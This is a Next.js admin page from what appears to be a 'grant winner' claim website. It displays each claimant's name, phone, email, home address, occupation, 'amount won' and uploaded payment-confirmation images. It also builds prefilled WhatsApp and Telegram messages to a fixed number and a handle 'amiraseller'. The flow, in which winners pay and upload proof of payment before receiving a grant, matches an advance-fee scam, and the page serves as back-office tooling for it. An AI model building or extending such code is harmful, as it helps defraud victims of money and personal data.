"use client";

import { useState, useEffect } from "react";
import { useRouter, useParams } from "next/navigation";
import Link from "next/link";

interface WinnerData {
  id: string;
  trackingNumber: string;
  name: string;
  amountWon: number;
  createdAt: string;
  claimInfo?: {
    fullName: string;
    phoneNumber: string;
    email: string;
    houseAddress: string;
    occupation: string;
    country: string;
    submittedAt: string;
    paymentMethod?: string;
    paymentConfirmedAt?: string;
    paymentFiles?: string[];
  };
  tempClaimInfo?: {
    fullName: string;
    phoneNumber: string;
    email: string;
    houseAddress: string;
    occupation: string;
    country: string;
    savedAt: string;
  };
}

export default function AdminStatusPage() {
  const router = useRouter();
  const params = useParams();
  const trackingNumber = params.trackingNumber as string;
  
  const [winner, setWinner] = useState<WinnerData | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    if (!trackingNumber) {
      router.push("/admin");
      return;
    }

    const fetchWinner = async () => {
      try {
        const res = await fetch(`/api/winners/${encodeURIComponent(trackingNumber)}`);
        const data = await res.json();

        if (!res.ok) {
          router.push("/admin");
          return;
        }

        setWinner(data);
      } catch {
        router.push("/admin");
      } finally {
        setLoading(false);
      }
    }

    fetchWinner();
  }, [trackingNumber, router]);

  const generateWhatsAppMessage = () => {
    if (!winner?.claimInfo) return "";
    
    const message = `GRANT CLAIM SUBMISSION

📋 PERSONAL INFORMATION:
- Full Name: ${winner.claimInfo.fullName}
- Phone: ${winner.claimInfo.phoneNumber}
- Email: ${winner.claimInfo.email}
- Address: ${winner.claimInfo.houseAddress}
- Occupation: ${winner.claimInfo.occupation}
- Country: ${winner.claimInfo.country}

GRANT DETAILS:
- Tracking Number: ${winner.trackingNumber}
- Grant Amount: $${winner.amountWon.toLocaleString()}
- Payment Method: ${winner.claimInfo.paymentMethod || 'Not specified'}
- Payment Confirmed: ${winner.claimInfo.paymentConfirmedAt ? new Date(winner.claimInfo.paymentConfirmedAt).toLocaleDateString() : 'Not confirmed'}

📄 PAYMENT CONFIRMATION:
- Files Uploaded: ${winner.claimInfo.paymentFiles?.length || 0}
- Submission Date: ${new Date(winner.claimInfo.submittedAt).toLocaleDateString()}

Please process my grant claim and confirm the next steps. Thank you!`;

    return encodeURIComponent(message);
  };

  const generateTelegramMessage = () => {
    if (!winner?.claimInfo) return "";
    
    const message = `GRANT CLAIM SUBMISSION

PERSONAL INFORMATION:
- Full Name: ${winner.claimInfo.fullName}
- Phone: ${winner.claimInfo.phoneNumber}
- Email: ${winner.claimInfo.email}
- Address: ${winner.claimInfo.houseAddress}
- Occupation: ${winner.claimInfo.occupation}
- Country: ${winner.claimInfo.country}

GRANT DETAILS:
- Tracking Number: ${winner.trackingNumber}
- Grant Amount: $${winner.amountWon.toLocaleString()}
- Payment Method: ${winner.claimInfo.paymentMethod || 'Not specified'}
- Payment Confirmed: ${winner.claimInfo.paymentConfirmedAt ? new Date(winner.claimInfo.paymentConfirmedAt).toLocaleDateString() : 'Not confirmed'}

PAYMENT CONFIRMATION:
- Files Uploaded: ${winner.claimInfo.paymentFiles?.length || 0}
- Submission Date: ${new Date(winner.claimInfo.submittedAt).toLocaleDateString()}

Please process my grant claim and confirm the next steps. Thank you!`;

    // Remove line breaks and replace with spaces, then encode
    const cleanMessage = message.replace(/\n/g, ' ').replace(/\s+/g, ' ').trim();
    return encodeURIComponent(cleanMessage);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-emerald-600 mx-auto mb-4"></div>
          <p className="text-slate-600">Loading user status...</p>
        </div>
      </div>
    );
  }

  if (!winner) {
    return (
      <div className="min-h-screen bg-slate-50">
        <header className="border-b border-slate-200 bg-white">
          <div className="mx-auto max-w-4xl px-4 py-4">
            <Link href="/admin" className="text-emerald-600 hover:text-emerald-700 font-medium">
              ← Back to Admin Panel
            </Link>
          </div>
        </header>
        <main className="mx-auto max-w-2xl px-4 py-16">
          <div className="bg-red-50 border border-red-200 rounded-lg p-4">
            <p className="text-red-800">User information not found.</p>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50">
      <header className="border-b border-slate-200 bg-white">
        <div className="mx-auto max-w-4xl px-4 py-4">
          <Link href="/admin" className="text-emerald-600 hover:text-emerald-700 font-medium">
            ← Back to Admin Panel
          </Link>
        </div>
      </header>

      <main className="mx-auto max-w-4xl px-4 py-8">
        {/* Admin Header */}
        <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <div className="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center mr-3">
                <svg className="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
              </div>
              <div>
                <h1 className="text-lg font-semibold text-amber-800">Admin View</h1>
                <p className="text-sm text-amber-600">Complete user information and status</p>
              </div>
            </div>
            <div className="text-right">
              <p className="text-sm text-amber-600">Tracking Number</p>
              <p className="font-mono text-amber-800 font-medium">{winner.trackingNumber}</p>
            </div>
          </div>
        </div>

        {/* User Status */}
        <div className="text-center mb-8">
          {winner.claimInfo ? (
            <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
          ) : winner.tempClaimInfo ? (
            <div className="w-16 h-16 bg-amber-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
          ) : (
            <div className="w-16 h-16 bg-slate-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4" />
              </svg>
            </div>
          )}
          <h1 className="text-3xl font-bold text-slate-800 mb-2">
            {winner.claimInfo ? "Claim Completed" : winner.tempClaimInfo ? "Form Filled" : "No Claim Started"}
          </h1>
          <p className="text-slate-600">
            {winner.claimInfo 
              ? "User has successfully submitted claim and payment confirmation"
              : winner.tempClaimInfo 
              ? "User has filled claim form but not uploaded payment confirmation"
              : "User has not started the claim process"
            }
          </p>
        </div>

        {/* User Details Card */}
        <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6 mb-6">
          <h2 className="text-lg font-semibold text-slate-800 mb-4">User Information</h2>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* Personal Information */}
            <div>
              <h3 className="text-sm font-medium text-slate-700 mb-3">Personal Details</h3>
              <div className="space-y-2">
                <div>
                  <span className="text-sm text-slate-500">Full Name:</span>
                  <p className="text-slate-800 font-medium">
                    {winner.claimInfo?.fullName || winner.tempClaimInfo?.fullName || 'Not provided'}
                  </p>
                </div>
                <div>
                  <span className="text-sm text-slate-500">Phone Number:</span>
                  <p className="text-slate-800 font-medium">
                    {winner.claimInfo?.phoneNumber || winner.tempClaimInfo?.phoneNumber || 'Not provided'}
                  </p>
                </div>
                <div>
                  <span className="text-sm text-slate-500">Email:</span>
                  <p className="text-slate-800 font-medium">
                    {winner.claimInfo?.email || winner.tempClaimInfo?.email || 'Not provided'}
                  </p>
                </div>
                <div>
                  <span className="text-sm text-slate-500">House Address:</span>
                  <p className="text-slate-800 font-medium">
                    {winner.claimInfo?.houseAddress || winner.tempClaimInfo?.houseAddress || 'Not provided'}
                  </p>
                </div>
                <div>
                  <span className="text-sm text-slate-500">Occupation:</span>
                  <p className="text-slate-800 font-medium">
                    {winner.claimInfo?.occupation || winner.tempClaimInfo?.occupation || 'Not provided'}
                  </p>
                </div>
                <div>
                  <span className="text-sm text-slate-500">Country:</span>
                  <p className="text-slate-800 font-medium">
                    {winner.claimInfo?.country || winner.tempClaimInfo?.country || 'Not provided'}
                  </p>
                </div>
              </div>
            </div>

            {/* Grant Information */}
            <div>
              <h3 className="text-sm font-medium text-slate-700 mb-3">Grant Details</h3>
              <div className="space-y-2">
                <div>
                  <span className="text-sm text-slate-500">Tracking Number:</span>
                  <p className="text-slate-800 font-medium font-mono">{winner.trackingNumber}</p>
                </div>
                <div>
                  <span className="text-sm text-slate-500">Grant Amount:</span>
                  <p className="text-slate-800 font-medium text-emerald-600">${winner.amountWon.toLocaleString()}</p>
                </div>
                <div>
                  <span className="text-sm text-slate-500">Payment Method:</span>
                  <p className="text-slate-800 font-medium">{winner.claimInfo?.paymentMethod || 'Not specified'}</p>
                </div>
                <div>
                  <span className="text-sm text-slate-500">Payment Confirmed:</span>
                  <p className="text-slate-800 font-medium">
                    {winner.claimInfo?.paymentConfirmedAt 
                      ? new Date(winner.claimInfo.paymentConfirmedAt).toLocaleDateString()
                      : 'Not confirmed'
                    }
                  </p>
                </div>
                <div>
                  <span className="text-sm text-slate-500">Form Submitted:</span>
                  <p className="text-slate-800 font-medium">
                    {winner.claimInfo?.submittedAt 
                      ? new Date(winner.claimInfo.submittedAt).toLocaleDateString()
                      : winner.tempClaimInfo?.savedAt
                      ? new Date(winner.tempClaimInfo.savedAt).toLocaleDateString()
                      : 'Not submitted'
                    }
                  </p>
                </div>
                <div>
                  <span className="text-sm text-slate-500">Files Uploaded:</span>
                  <p className="text-slate-800 font-medium">{winner.claimInfo?.paymentFiles?.length || 0} file(s)</p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Uploaded Files Preview */}
        {winner.claimInfo?.paymentFiles && winner.claimInfo.paymentFiles.length > 0 && (
          <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6 mb-6">
            <h2 className="text-lg font-semibold text-slate-800 mb-4">Uploaded Payment Confirmations</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {winner.claimInfo.paymentFiles.map((file, index) => (
                <div key={index} className="border border-slate-200 rounded-lg overflow-hidden group">
                  <div className="aspect-video bg-slate-100 relative">
                    <img
                      src={file} // Now file is the blob URL directly
                      alt={`Payment confirmation ${index + 1}`}
                      className="w-full h-full object-cover"
                      onError={(e) => {
                        // Fallback to placeholder if image fails to load
                        const target = e.target as HTMLImageElement;
                        target.style.display = 'none';
                        target.parentElement!.innerHTML = `
                          <div class="w-full h-full flex items-center justify-center bg-slate-100">
                            <svg class="w-12 h-12 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                            </svg>
                          </div>
                        `;
                      }}
                    />
                    <div className="absolute inset-0 bg-black bg-opacity-0 group-hover:bg-opacity-10 transition-opacity flex items-center justify-center opacity-0 group-hover:opacity-100">
                      <a
                        href={file} // Now file is the blob URL directly
                        target="_blank"
                        rel="noopener noreferrer"
                        className="px-3 py-1 bg-white text-slate-800 text-sm rounded-lg shadow-lg hover:bg-slate-50 transition-colors"
                      >
                        View Full Size
                      </a>
                    </div>
                  </div>
                  <div className="p-3">
                    <p className="text-sm text-slate-600 truncate">{file}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Admin Actions */}
        <div className="bg-slate-50 border border-slate-200 rounded-xl p-6">
          <h2 className="text-lg font-semibold text-slate-800 mb-4">Admin Actions</h2>
          
          {winner.claimInfo ? (
            <div className="flex flex-col sm:flex-row gap-4">
              <a
                href={`https://wa.me/18722605215?text=${generateWhatsAppMessage()}`}
                target="_blank"
                rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center px-6 py-3 bg-green-600 text-white font-medium rounded-lg hover:bg-green-700 transition-colors"
              >
                <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.149-.67.149-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.074-.297-.149-1.255-.462-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.521.151-.172.2-.296.3-.495.099-.198.05-.372-.025-.521-.075-.148-.669-1.611-.916-2.206-.242-.579-.487-.501-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414-.074-.123-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
                </svg>
                Contact via WhatsApp
              </a>
              
              <a
                href={`https://t.me/amiraseller?text=${generateTelegramMessage()}`}
                target="_blank"
                rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center px-6 py-3 bg-blue-600 text-white font-medium rounded-lg hover:bg-blue-700 transition-colors"
              >
                <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12.056 0zm.165 14.648c1.74.03 3.38-.46 4.4-1.25.98-.76 1.48-1.78 1.48-3.07 0-1.28-.5-2.31-1.48-3.07-1.02-.79-2.66-1.28-4.4-1.25-1.74-.03-3.38.46-4.4 1.25-.98.76-1.48 1.78-1.48 3.07 0 1.28.5 2.31 1.48 3.07 1.02.79 2.66 1.28 4.4 1.25zm0-1.44c-1.43-.03-2.77-.38-3.6-1.01-.78-.6-1.18-1.38-1.18-2.37 0-.99.4-1.77 1.18-2.37.83-.63 2.17-.98 3.6-1.01 1.43.03 2.77.38 3.6 1.01.78.6 1.18 1.38 1.18 2.37 0 .99-.4 1.77-1.18 2.37-.83.63-2.17.98-3.6 1.01zm-1.08-3.54c.28-.28.73-.28 1.01 0 .28.28.28.73 0 1.01-.28.28-.73.28-1.01 0-.28-.28-.28-.73 0-1.01zm2.16 0c.28-.28.73-.28 1.01 0 .28.28.28.73 0 1.01-.28.28-.73.28-1.01 0-.28-.28-.28-.73 0-1.01z"/>
                </svg>
                Contact via Telegram
              </a>
            </div>
          ) : (
            <div className="text-center py-8">
              <p className="text-slate-600">User has not completed the claim process yet.</p>
              <p className="text-sm text-slate-500 mt-2">Contact options will be available once user submits payment confirmation.</p>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
